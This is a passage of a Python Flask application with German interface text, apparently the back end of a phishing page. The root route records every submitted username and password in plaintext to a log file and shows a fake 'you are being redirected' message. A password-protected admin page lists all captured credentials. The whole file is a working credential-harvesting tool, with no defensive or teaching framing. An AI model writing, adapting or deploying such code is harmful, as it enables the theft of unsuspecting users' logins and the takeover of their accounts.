LOG_FILE = "log.txt"
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] Username: {username} | Password: {password}\n")

        return "<h2>Danke! Du wirst weitergeleitet...</h2>"

    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("")

    if request.method == "POST":
        entered_password = request.form.get("password")
        if entered_password != ADMIN_PASSWORD:
            return "<h3>❌ Falsches Passwort!</h3><a href='/admin'>Zurück</a>"

        try:
            with open(LOG_FILE, "r") as f:
                logs = f.readlines()

            if not logs:
                return "<h3>Keine Eingaben bisher.</h3>"

            content = "<br>".join(
                line.strip().replace("<", "&lt;").replace(">", "&gt;") for line in logs
            )
            return f"<h3>Login-Daten:</h3><div style='font-family: monospace'>{content}</div>"

        except Exception as e:
            return f"<h3>Fehler beim Lesen der Datei: {str(e)}</h3>"

    return '''
        <h2>🔐 Admin-Bereich</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Passwort" required>
            <button type="submit">Login</button>
        </form>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
